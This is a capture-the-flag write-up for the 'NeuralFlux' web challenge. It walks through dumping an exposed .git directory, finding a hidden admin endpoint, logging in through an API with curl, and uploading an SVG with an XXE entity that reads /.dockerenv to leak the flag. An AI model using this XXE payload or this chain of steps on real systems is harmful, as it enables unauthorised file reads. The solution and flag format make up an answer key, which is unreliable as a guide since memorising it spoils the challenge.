# NeuralFlux

**Category:** web  **Author:** PsychoSherlock

Everything is in `NeuralFlux.zip` (Dockerfile, nginx config, the Flask backend and the static site). Unzip it and `docker build -t neuralflux . && docker run -p 80:80 neuralflux`.

## Solution

The site is a static AI-company landing page, and nginx serves the whole `NeuralFluxWeb` folder, `.git` included. Dump it with git-dumper (or similar) and read the history. The commits are from an intern who built the site with Copilot, and one of them is "Removed some sensitive message by the stupid dev". The diff of `.github/copilot-instructions.md` shows what was removed:

```
-Note from Dev: As we have encountered unexpected attempts on our prod environment, we have moved the Admin API to the
-/NeuralFluxCorpAdministrationProtectedEndpoint/
```

The same file says the internal API collections live in "the Postman Workspace of `NeuralFluxCorp`". That public workspace has the collection: every request needs an `X-NEURALEND-KEY` header, and it shows the endpoints (`/api/contract`, `/api/admin/login`, `/api/upload-image`, `/api/images/<id>`, ...) and the admin login.

Log in through the hidden prefix and grab the JWT:

```
curl -s http://HOST/NeuralFluxCorpAdministrationProtectedEndpoint/api/admin/login \
  -H 'X-NEURALEND-KEY: <key>' -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"<password>"}'
```

The admin can upload a profile picture. Only `.svg` is accepted, it's always saved as `admin.svg`, and `/api/images/admin.svg` doesn't serve the file as-is: it parses it with lxml using `resolve_entities=True` and returns the result. That's XXE. The entrypoint writes the flag into `/.dockerenv`:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///.dockerenv"> ]>
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
```

```
curl -s .../api/upload-image -H 'X-NEURALEND-KEY: <key>' -H "Authorization: Bearer $TOKEN" -F image=@payload.svg
curl -s .../api/images/admin.svg
```

Flag is per-instance: `H7CTF{FR0m_m1sc0nfigs_4ND_API_ATT4CK5_T0_XX3_1nj3ctioN_<uuid>}`
